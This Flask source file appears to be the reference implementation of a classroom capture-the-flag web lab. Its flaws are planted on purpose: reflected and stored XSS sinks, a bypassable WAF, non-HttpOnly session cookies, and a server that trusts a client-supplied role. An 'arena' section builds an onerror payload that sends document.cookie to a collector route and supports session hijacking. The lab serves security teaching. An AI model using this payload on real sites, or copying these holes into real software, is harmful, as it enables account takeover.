# Village Trading Hub — Camp 9 CTF — reference implementation
# =============================================================
# BUILD STATUS (order: XSS-reflected -> JS -> web_lhf -> XSS-stored)
#   [DONE] Foundation: app, non-HttpOnly mayor cookie, login/logout, home, admin stub
#   [DONE] XSS-1 /search (HTML body), XSS-2 /search (attribute), XSS-4 /search?guard=on (WAF)
#   [DONE] XSS-3 /enchant (JS-string context)
#   [TODO] JS-1..4, WEB-1..5, XSS-5/6  -> implemented next (stubs below, each cites lab.txt section)
# Spec: ../lab.txt (Part 1 = infra, Part 2 = per-challenge). Run: see README.md
import os
import re
import base64
from flask import Flask, request, render_template, redirect, make_response, jsonify, send_from_directory

app = Flask(__name__, static_url_path="", static_folder="static")
app.config["SECRET_KEY"] = "change-me-at-deploy"  # not used for auth; see lab.txt §3

# --- Secrets: flags / creds are NOT stored in this repo. They come from _secrets.py
#     (gitignored) or environment variables. See _secrets.example.py. Placeholders below
#     keep the app runnable without secrets, but every flag will read "LOC9{REDACTED...}". ---
try:
    from _secrets import SECRETS
except Exception:
    SECRETS = {}


def _sec(key, default):
    v = os.environ.get(key)
    return v if v is not None else SECRETS.get(key, default)


def _b64(s):
    return base64.b64encode(s.encode()).decode()


def _xor_b64(s, key):  # base64( XOR(s, key) ) — matches the JS-4 vault.js decoder
    return base64.b64encode(bytes(b ^ key for b in s.encode())).decode()


@app.after_request
def _map_mimetype(resp):
    # JS-2: serve *.map as JSON so DevTools/curl read the source map inline (lab.txt §4 / JS-2)
    if request.path.endswith(".map"):
        resp.mimetype = "application/json"
    return resp

# ---------------------------------------------------------------------------
# In-memory store (simple + auditable; swap for sqlite per lab.txt §3 if preferred)
# ---------------------------------------------------------------------------
USERS = {  # username -> (password, role)
    "mayor":  (_sec("MAYOR_PASSWORD", "change_me_mayor_password"), "mayor"),   # <- Admin Bot logs in as this (lab.txt §3)
    "player": ("player", "user"),
}
PROFILES = {  # username -> {avatar_url, bio}  (avatar_url is the XSS-5 stored sink; "" -> default NPC avatar)
    "mayor":  {"avatar_url": "", "bio": "Mayor of the village."},
    "player": {"avatar_url": "", "bio": "A traveling trader."},
}
REVIEWS = [  # {author, body}  (body rendered raw on /reviews; CSP neutralizes inline there)
    {"author": "player", "body": "Great trades, fair prices!"},
]
SESSIONS = {}  # opaque token -> username  (cookie value stays short; lab.txt §3)

# Flags/creds come from _secrets.py or env (see loader above). NOTE: JS1_DEV_KEY and
# MAYOR_OVERRIDE are deliberately client-discoverable puzzle tokens (planted in trading.js /
# forge.js on purpose) — they are NOT flags, so they stay as plain literals here.
JS1_FLAG = _sec("JS1_FLAG", "LOC9{REDACTED_set_in__secrets}")
JS1_DEV_KEY = "villager_dev_2026"
JS3_FLAG = _sec("JS3_FLAG", "LOC9{REDACTED_set_in__secrets}")
MAYOR_OVERRIDE = "MAYOR_2026"
# JS-2 flag is served (encrypted) at /assets/vip/launch.flag (built by gen_crypto.py from JS2_FLAG).
# JS-4 flag never ships plaintext; vault.js plants base64(XOR(JS4_FLAG,0x2a)) injected per-render.
JS4_FLAG = _sec("JS4_FLAG", "LOC9{REDACTED_set_in__secrets}")

# --- Web-LHF (WEB-1..5) ---
WEB1_FLAG = _sec("WEB1_FLAG", "LOC9{REDACTED_set_in__secrets}")   # rendered server-side on /secret-cellar/
WEB2_FLAG = _sec("WEB2_FLAG", "LOC9{REDACTED_set_in__secrets}")   # rendered on /hidden/trade-archive
WEB5_FLAG = _sec("WEB5_FLAG", "LOC9{REDACTED_set_in__secrets}")
# WEB-3/WEB-4 flags live inside files (base64 notes.txt / base64+XOR config.bak.enc) — see tools/gen_crypto.py
DEV_BACKUP_DIR = os.path.join(app.root_path, "dev-backup")

# --- XSS reflected flags (surfaced server-side as base64 into the page; never plaintext) ---
XSS1_FLAG = _sec("XSS1_FLAG", "LOC9{REDACTED_set_in__secrets}")
XSS2_FLAG = _sec("XSS2_FLAG", "LOC9{REDACTED_set_in__secrets}")
XSS3_FLAG = _sec("XSS3_FLAG", "LOC9{REDACTED_set_in__secrets}")
XSS4_FLAG = _sec("XSS4_FLAG", "LOC9{REDACTED_set_in__secrets}")
TRADE_ITEMS = [
    {"id": "bread",         "name": "Bread",                   "price": 2,  "mayor_only": False},
    {"id": "emerald_block", "name": "Emerald Block",           "price": 9,  "mayor_only": False},
    {"id": "diamond_sword", "name": "Enchanted Diamond Sword", "price": 64, "mayor_only": True},
]
# NOTE: standalone Stored-XSS (XSS-5/6) and the SQLi "Village Market" were REMOVED as challenges.
# The stored-XSS *mechanism* — non-HttpOnly mayor cookie, the /profile avatar sink, the Admin Bot,
# and the mayor-only /admin page — is KEPT only because the EXTRA craft challenge reuses it to reveal
# the Enchant Seal. There are no XSS5/XSS6/SQLi flags anymore.

# --- EXTRA (final boss): Crafting Table. Chains web_lhf + crypto + a stored-XSS session hijack:
#     web_lhf  -> find the hidden recipe scroll  /forge-recipes/codex.recipe
#     crypto   -> decode it (From Base64, then XOR key 0x3b)  => the 3x3 grid pattern
#     XSS      -> the Mayor's Enchant Seal is shown ONLY on /admin (reach it by stealing the mayor
#                 cookie: plant an onerror payload in the /profile avatar, let the Admin Bot load it)
#     then arrange the 3x3 grid at /craft + paste the seal -> forge the Enchanted Book (flag). ---
CRAFT_FLAG = _sec("CRAFT_FLAG", "LOC9{REDACTED_set_in__secrets}")
ENCHANT_SEAL = _sec("ENCHANT_SEAL", "SET-ME-ENCHANT-SEAL")   # on /admin only -> requires XSS-5
CRAFT_RECIPE = SECRETS.get("CRAFT_RECIPE", ["diamond", "ender_pearl", "diamond",
                                            "emerald", "golden_apple", "emerald",
                                            "diamond", "ender_pearl", "diamond"])


def current_user():
    return SESSIONS.get(request.cookies.get("session"))


def role_of(username):
    return USERS.get(username, (None, None))[1]


# ---------------------------------------------------------------------------
# Foundation routes
# ---------------------------------------------------------------------------
@app.route("/")
def home():
    # Nav in base.html links to EVERY page so the Admin Bot's "click every link" traverses the app.
    return render_template("home.html", user=current_user())


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u in USERS and USERS[u][0] == p:
            import secrets as _s
            token = _s.token_hex(8)         # short opaque token
            SESSIONS[token] = u
            resp = make_response(redirect("/"))
            # lab.txt §3: the mayor cookie MUST be non-HttpOnly (the Stored-XSS lesson).
            resp.set_cookie("session", token,
                            httponly=False,   # <-- REQUIRED for XSS-5/XSS-6
                            samesite="Lax",   # Lax so the Admin Bot top-level nav still sends it
                            secure=False,     # lab runs over http
                            path="/")
            return resp
        error = "Invalid credentials"
    return render_template("login.html", error=error, user=current_user())


@app.route("/logout")
def logout():
    tok = request.cookies.get("session")
    SESSIONS.pop(tok, None)
    resp = make_response(redirect("/"))
    resp.delete_cookie("session")
    return resp


@app.route("/admin")
def admin():
    # XSS-5 target: session-ride here with the stolen mayor cookie to read the flag.
    if role_of(current_user()) != "mayor":
        return render_template("stub.html", title="Admin", user=current_user(),
                               note="403 — mayor only. (Steal the mayor cookie via the stored-XSS avatar sink, then session-ride here.)"), 403
    return render_template("admin.html", user=current_user(), enchant_seal=ENCHANT_SEAL)


# ---------------------------------------------------------------------------
# XSS — Reflected  (XSS-1, XSS-2, XSS-4 on /search ; XSS-3 on /enchant)
# Spec: lab.txt §4.1 / §4.2.  Rule: window.*Flag defined in <head> BEFORE the reflection.
# ---------------------------------------------------------------------------
WAF = re.compile(r"script|onerror", re.IGNORECASE)  # XSS-4 blocklist: blocks script/onerror, allows svg/onload


@app.route("/search")
def search():
    q = request.args.get("q", "")
    guard = request.args.get("guard") == "on"   # "Iron Golem's Shield" WAF variant (XSS-4)
    blocked = False
    if guard and WAF.search(q):
        q, blocked = "", True                    # WAF scrubs the reflection
    # search.html reflects q UNESCAPED in BOTH body and attribute. NO CSP on this route (intentional).
    return render_template("search.html", q=q, guard=guard, blocked=blocked, user=current_user(),
                           sign_b64=_b64(XSS1_FLAG), secret_b64=_b64(XSS2_FLAG), golem_b64=_b64(XSS4_FLAG))


@app.route("/enchant")
def enchant():
    q = request.args.get("q", "")
    # enchant.html reflects q inside a single-quoted JS string (XSS-3). NO CSP on this route.
    return render_template("enchant.html", q=q, user=current_user(), enchant_b64=_b64(XSS3_FLAG))


# ---------------------------------------------------------------------------
# JS — recon (JS-1 leaked API ; JS-2 source map = static files ; JS-3/4 below)
# Spec: lab.txt Part 2 [JS-1], [JS-2].
# ---------------------------------------------------------------------------
@app.route("/api/v1/dev/secret")
def dev_secret():
    # JS-1: the "backup API" leaked in the trading.js comment. Flag only on correct key.
    if request.args.get("key") == JS1_DEV_KEY:
        return jsonify({"flag": JS1_FLAG})              # 200
    return jsonify({"error": "unauthorized"}), 401       # wrong/missing key -> no flag

# JS-2 is purely static: /assets/js/trading_logic.min.js + .map (flag only in the .map sourcesContent).
# Home page (home.html) loads trading.js (JS-1) and trading_logic.min.js (JS-2) so both appear in DevTools.


# JS-3: Client-Side Anvil — client gate (forge.js) + SERVER-SIDE flag. lab.txt [JS-3].
@app.route("/forge")
def forge_page():
    return render_template("forge.html", user=current_user())


@app.route("/api/forge/repair", methods=["GET", "POST"])
def forge_repair():
    # POST-only in spirit; GET returns 405 (explicit, so the static catch-all can't turn it into 404)
    if request.method == "GET":
        return jsonify({"error": "method not allowed"}), 405
    data = request.get_json(silent=True) or {}
    if data.get("override") == MAYOR_OVERRIDE:        # token leaked in forge.js
        return jsonify({"ok": True, "flag": JS3_FLAG})
    return jsonify({"ok": False, "error": "Access Denied"}), 403


# JS-4: Obfuscated Spellbook — vault page + obfuscated vault.js (base64+XOR). lab.txt [JS-4].
@app.route("/vault")
def vault_page():
    return render_template("vault.html", user=current_user(), vault_token=_xor_b64(JS4_FLAG, 0x2a))


# ---------------------------------------------------------------------------
# Web-LHF (WEB-1 robots, WEB-2 sitemap, WEB-3 dir enum, WEB-4 crypto file, WEB-5 trade)
# Spec: lab.txt Part 2 [WEB-1..5]; crypto assets generated by tools/gen_crypto.py (§6).
# ---------------------------------------------------------------------------
ROBOTS_TXT = "User-agent: *\nAllow: /\nDisallow: /secret-cellar/\n"


@app.route("/robots.txt")                 # WEB-1: the ONLY pointer to /secret-cellar/
def robots():
    return make_response((ROBOTS_TXT, 200, {"Content-Type": "text/plain; charset=utf-8"}))


@app.route("/secret-cellar/")             # trailing slash -> Flask 308-redirects /secret-cellar here
def secret_cellar():
    return render_template("secret_cellar.html", flag=WEB1_FLAG)


@app.route("/sitemap.xml")                # WEB-2: one unlinked endpoint among nav decoys (host-correct)
def sitemap():
    base = request.host_url.rstrip("/")
    locs = ["/", "/search", "/trade", "/reviews", "/profile/player", "/hidden/trade-archive"]
    urls = "".join("  <url><loc>%s%s</loc></url>\n" % (base, p) for p in locs)
    xml = ('<?xml version="1.0" encoding="UTF-8"?>\n'
           '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n' + urls + "</urlset>\n")
    return make_response((xml, 200, {"Content-Type": "application/xml; charset=utf-8"}))


@app.route("/hidden/trade-archive")
@app.route("/hidden/trade-archive/")      # trailing slash must not 404
def trade_archive():
    return render_template("trade_archive.html", flag=WEB2_FLAG)


@app.route("/dev-backup/")                # WEB-3: directory listing intentionally ON (the finding)
def dev_backup_index():
    try:
        files = sorted(os.listdir(DEV_BACKUP_DIR))
    except FileNotFoundError:
        files = []
    rows = '<a href="../">../</a>\n' + "".join('<a href="%s">%s</a>\n' % (f, f) for f in files)
    return ("<html><head><title>Index of /dev-backup/</title></head><body>"
            "<h1>Index of /dev-backup/</h1><hr><pre>" + rows + "</pre><hr></body></html>")


@app.route("/dev-backup")
def dev_backup_redirect():
    return redirect("/dev-backup/", code=301)


@app.route("/dev-backup/<path:filename>")  # notes.txt (WEB-3 base64), config.bak.enc (WEB-4 base64+XOR)
def dev_backup_file(filename):
    return send_from_directory(DEV_BACKUP_DIR, filename)


@app.route("/trade")                      # WEB-5: Mayor item's Buy button disabled CLIENT-side only
def trade():
    return render_template("trade.html", items=TRADE_ITEMS, user=current_user())


@app.route("/api/trade", methods=["GET", "POST"])  # GET -> 405 (explicit; static catch-all would 404)
def api_trade():
    if request.method == "GET":
        return jsonify(ok=False, error="method not allowed"), 405
    item = request.form.get("item", "")
    role = request.form.get("role", "")
    can_buy = request.form.get("can_buy", "")
    known = next((i for i in TRADE_ITEMS if i["id"] == item), None)
    if known is None:
        return jsonify(ok=False, error="Unknown item."), 404
    if known["mayor_only"]:
        # THE BUG: server trusts client-supplied role / can_buy, never a real server-side role.
        if role == "mayor" or can_buy == "true":
            return jsonify(ok=True, message="The Mayor's seal is accepted. Trade complete!", flag=WEB5_FLAG)
        return jsonify(ok=False, error="Only the Mayor may purchase the Enchanted Diamond Sword."), 403
    return jsonify(ok=True, message="Trade complete: you bought %s." % known["name"])


# ---------------------------------------------------------------------------
# Stored-XSS plumbing kept ONLY for the EXTRA challenge (no standalone XSS-5/XSS-6 anymore):
#   /reviews   — the board where a player posts a review so their author->profile link appears,
#                which is how the Admin Bot (mayor) reaches the attacker's profile.
#   /profile/<u> — avatar_url is rendered UNESCAPED (the sink); an onerror payload steals the
#                  non-HttpOnly mayor cookie when the bot views it. Review bodies are escaped.
#   /admin     — mayor-only; shows the Enchant Seal used by EXTRA.
# ---------------------------------------------------------------------------
def save_review(author, body):
    REVIEWS.append({"author": author, "body": body})   # body rendered ESCAPED on /reviews


@app.route("/reviews", methods=["GET", "POST"])
def reviews():
    if request.method == "POST":
        u = current_user()
        if not u:
            return redirect("/login")
        save_review(u, request.form.get("body", ""))
        return redirect("/reviews")
    return render_template("reviews.html", reviews=REVIEWS, user=current_user())


@app.route("/profile", methods=["GET", "POST"])
def my_profile():
    u = current_user()
    if not u:
        return redirect("/login")
    prof = PROFILES.setdefault(u, {"avatar_url": "", "bio": ""})
    if request.method == "POST":
        prof["avatar_url"] = request.form.get("avatar_url", "")    # stored; sink = /profile/<u> (no CSP)
        prof["bio"] = request.form.get("bio", "")
        return redirect("/profile")
    return render_template("profile.html", user=u, avatar_url=prof["avatar_url"], bio=prof["bio"])


@app.route("/profile/<username>")
def profile_public(username):
    prof = PROFILES.get(username, {"avatar_url": "", "bio": ""})
    # avatar_url rendered UNESCAPED (the stored-XSS sink EXTRA relies on); bio escaped. NO CSP header.
    return render_template("profile_public.html", username=username, user=current_user(),
                           avatar_url=prof["avatar_url"], bio=prof["bio"])


# ---------------------------------------------------------------------------
# EXTRA — Crafting Table (final boss). web_lhf + crypto + stored-XSS chained.
#   The recipe scroll /forge-recipes/codex.recipe is a STATIC file (base64+XOR 0x3b).
#   The enchant seal lives on /admin (reach it via the stored-XSS mayor-cookie theft).
#   /api/craft validates grid AND seal.
# ---------------------------------------------------------------------------
@app.route("/craft")
def craft_page():
    return render_template("craft.html", user=current_user())


@app.route("/api/craft", methods=["GET", "POST"])
def api_craft():
    if request.method == "GET":
        return jsonify(ok=False, error="method not allowed"), 405
    data = request.get_json(silent=True) or {}
    grid = data.get("grid")
    seal = (data.get("seal") or "").strip()
    if not isinstance(grid, list) or len(grid) != 9:
        return jsonify(ok=False, error="The crafting grid must have 9 slots."), 400
    if seal != ENCHANT_SEAL:
        return jsonify(ok=False,
                       error="The Mayor's Enchant Seal is missing or wrong — find it on the Mayor's dashboard."), 403
    if [(g or "").strip() for g in grid] != CRAFT_RECIPE:
        return jsonify(ok=False,
                       error="These ingredients do not match the Codex recipe. Decode the lost scroll and try again."), 422
    return jsonify(ok=True, book="Enchanted Book of the Village Codex", flag=CRAFT_FLAG)


# ===========================================================================
# ARENA — classroom PvP cookie-theft (SEPARATE from the 14 CTFd challenges).
#   Teaches JS 1.5 (document.cookie + string-concat exfil) + Stored XSS, peer-vs-peer.
#   Each student self-registers a TEST account -> gets a non-HttpOnly `arena_session`
#   cookie + a private flag at /arena/me. Each profile /arena/u/<name> has a guestbook
#   rendered RAW with NO CSP (the stored-XSS sink). Post an onerror payload on a
#   classmate's board; when they open it, their cookie exfils to your webhook; ride it
#   to /arena/me to read their flag, then /arena/claim it. Closed lab network only.
# ===========================================================================
ARENA_USERS = {}       # name -> {"pin": str, "flag": str}
ARENA_SESSIONS = {}    # token -> name
GUESTBOOKS = {}        # name -> [ {"author": str, "body": str} ]   (body rendered RAW = the sink)
LOOT = {}              # attacker name -> [ stolen document.cookie strings ]  (caught by /arena/steal)
CLAIMS = {}            # attacker name -> set(victim names)
ARENA_ADMIN_PIN = _sec("ARENA_ADMIN_PIN", "teacher-reset")
# 1x1 transparent GIF returned by the built-in "attacker server" so the <img> trap loads cleanly.
_ARENA_GIF = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")


def arena_trap(by):
    # Teaching payload: it narrates itself with alert() at every step so the victim SEES what
    # runs in their browser -- it proves XSS, reads document.cookie + location, then sends the
    # cookie out with new Image().src (the classic exfiltration trick). No page navigation.
    # IMPORTANT: no double-quotes (") anywhere inside -- they would close the onerror="" attribute
    # and break the whole script. Send the cookie FIRST so the steal always happens even if the
    # victim dismisses the dialogs, then narrate each step with alert().
    steps = (
        "new Image().src='/arena/steal?by=%s&c='+encodeURIComponent(document.cookie);"
        "alert('① alert() ทำงาน = มี XSS! โค้ดที่เพื่อนแอบฝากไว้ กำลังรันในหน้าของคุณ');"
        "alert('② document.cookie\\nโค้ดอ่าน cookie ของคุณได้:\\n'+document.cookie);"
        "alert('③ location\\nโค้ดรู้ว่าคุณอยู่หน้าไหน:\\n'+location.href);"
        "alert('④ new Image().src\\ncookie ของคุณถูกแอบส่งไปให้ %s ตั้งแต่ตอนเปิดหน้าแล้ว!')"
    ) % (by, by)
    return '<img src=x onerror="%s">' % steps


def _arena_slug(s):
    return re.sub(r"[^a-z0-9_]", "", (s or "").lower())[:20]


def arena_user():
    return ARENA_SESSIONS.get(request.cookies.get("arena_session"))


def _arena_cookie(resp, token):
    # non-HttpOnly on purpose: document.cookie must see it (that is the whole lesson)
    resp.set_cookie("arena_session", token, httponly=False, samesite="Lax", secure=False, path="/")
    return resp


def _new_token():
    import secrets as _s
    return _s.token_hex(8)


@app.route("/arena")
def arena_home():
    return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS), error=None)


@app.route("/arena/register", methods=["POST"])
def arena_register():
    name = _arena_slug(request.form.get("name", ""))
    pin = request.form.get("pin", "")
    if not name or not pin:
        return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS),
                               error="Need a name (a-z 0-9 _) and a PIN."), 400
    if name in ARENA_USERS:
        return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS),
                               error="That name is taken — use Login instead."), 400
    import secrets as _s
    ARENA_USERS[name] = {"pin": pin, "flag": "LOC9{pwn3d_%s_%s}" % (name, _s.token_hex(2))}
    GUESTBOOKS.setdefault(name, [])
    tok = _new_token(); ARENA_SESSIONS[tok] = name
    return _arena_cookie(make_response(redirect("/arena/me")), tok)


@app.route("/arena/login", methods=["POST"])
def arena_login():
    name = _arena_slug(request.form.get("name", "")); pin = request.form.get("pin", "")
    u = ARENA_USERS.get(name)
    if not u or u["pin"] != pin:
        return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS),
                               error="Wrong name or PIN."), 403
    tok = _new_token(); ARENA_SESSIONS[tok] = name
    return _arena_cookie(make_response(redirect("/arena/me")), tok)


@app.route("/arena/logout")
def arena_logout():
    ARENA_SESSIONS.pop(request.cookies.get("arena_session"), None)
    resp = make_response(redirect("/arena")); resp.delete_cookie("arena_session"); return resp


@app.route("/arena/me")
def arena_me():
    me = arena_user()
    if not me:
        return redirect("/arena")
    # Shows the flag of WHOEVER's cookie is presented -> ride a stolen cookie here to read a victim's flag.
    # This page does NOT render the guestbook raw, so the flag never sits next to the XSS sink.
    return render_template("arena_me.html", me=me, flag=ARENA_USERS[me]["flag"],
                           sig_count=len(GUESTBOOKS.get(me, [])), loot_count=len(LOOT.get(me, [])),
                           users=sorted(ARENA_USERS), planted=request.args.get("planted"))


@app.route("/arena/u/<name>", methods=["GET", "POST"])
def arena_profile(name):
    name = _arena_slug(name)
    if name not in ARENA_USERS:
        return render_template("arena_profile.html", me=arena_user(), name=name,
                               exists=False, entries=[]), 404
    if request.method == "POST":
        if not arena_user():
            return redirect("/arena")
        GUESTBOOKS.setdefault(name, []).append({"author": arena_user(),
                                                "body": request.form.get("body", "")})
        GUESTBOOKS[name] = GUESTBOOKS[name][-50:]   # cap the board
        if request.form.get("kind") == "payload":   # planted a payload -> go home so it doesn't fire on US
            return redirect("/arena/me?planted=%s" % name)
        return redirect("/arena/u/%s" % name)
    # NO CSP on this route -> guestbook body renders RAW = the stored-XSS sink.
    me = arena_user()
    return render_template("arena_profile.html", me=me, name=name, exists=True,
                           entries=GUESTBOOKS.get(name, []),
                           trap=arena_trap(me) if me else "")


@app.route("/arena/steal")                 # the built-in "attacker server" the trap payload calls
def arena_steal():
    by = _arena_slug(request.args.get("by", ""))
    c = (request.args.get("c", "") or "")[:600]
    if by and c and "arena_session=" in c:
        box = LOOT.setdefault(by, [])
        if c not in box:
            box.append(c)                  # keep each distinct stolen cookie once
    return make_response((_ARENA_GIF, 200, {"Content-Type": "image/gif"}))


@app.route("/arena/loot")                  # your caught cookies (requires your own login)
def arena_loot():
    me = arena_user()
    if not me:
        return redirect("/arena")
    return render_template("arena_loot.html", me=me, loot=LOOT.get(me, []), revealed=None)


@app.route("/arena/peek", methods=["POST"])   # use a stolen cookie to read that victim's flag
def arena_peek():
    me = arena_user()
    if not me:
        return redirect("/arena")
    m = re.search(r"arena_session=([0-9a-f]+)", request.form.get("cookie", ""))
    victim = ARENA_SESSIONS.get(m.group(1)) if m else None
    if not victim:
        revealed = {"ok": False, "text": "cookie นี้ใช้ไม่ได้/หมดอายุแล้ว — ลองเก็บอันใหม่"}
    elif victim == me:
        revealed = {"ok": False, "text": "นี่ cookie ของตัวเอง — ไปเอาของเพื่อน!"}
    else:
        revealed = {"ok": True, "victim": victim, "flag": ARENA_USERS[victim]["flag"]}
    return render_template("arena_loot.html", me=me, loot=LOOT.get(me, []), revealed=revealed)


@app.route("/arena/claim", methods=["POST"])
def arena_claim():
    me = arena_user()
    if not me:
        return redirect("/arena")
    stolen = (request.form.get("flag", "") or "").strip()
    victim = next((n for n, u in ARENA_USERS.items() if u["flag"] == stolen), None)
    if not victim:
        msg = ("bad", "นี่ไม่ใช่ flag ที่ถูกต้อง")
    elif victim == me:
        msg = ("bad", "นี่ flag ของตัวเอง — ไปเอา cookie ของเพื่อน!")
    else:
        CLAIMS.setdefault(me, set()).add(victim)
        msg = ("ok", "ได้ cookie ของ %s แล้ว! บันทึกขึ้นกระดานแล้ว 🍪" % victim)
    return render_template("arena_scoreboard.html", me=me, msg=msg,
                           board=sorted(((a, len(v)) for a, v in CLAIMS.items()), key=lambda x: -x[1]),
                           detail={a: sorted(v) for a, v in CLAIMS.items()})


@app.route("/arena/scoreboard")
def arena_scoreboard():
    return render_template("arena_scoreboard.html", me=arena_user(), msg=None,
                           board=sorted(((a, len(v)) for a, v in CLAIMS.items()), key=lambda x: -x[1]),
                           detail={a: sorted(v) for a, v in CLAIMS.items()})


@app.route("/arena/reset", methods=["POST"])   # teacher-only: clear boards + scoreboard (keeps accounts)
def arena_reset():
    if request.form.get("pin", "") != ARENA_ADMIN_PIN:
        return jsonify(ok=False, error="wrong teacher pin"), 403
    GUESTBOOKS.clear(); CLAIMS.clear()
    return jsonify(ok=True, message="guestbooks + scoreboard cleared (accounts kept)")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "8000")), debug=False)
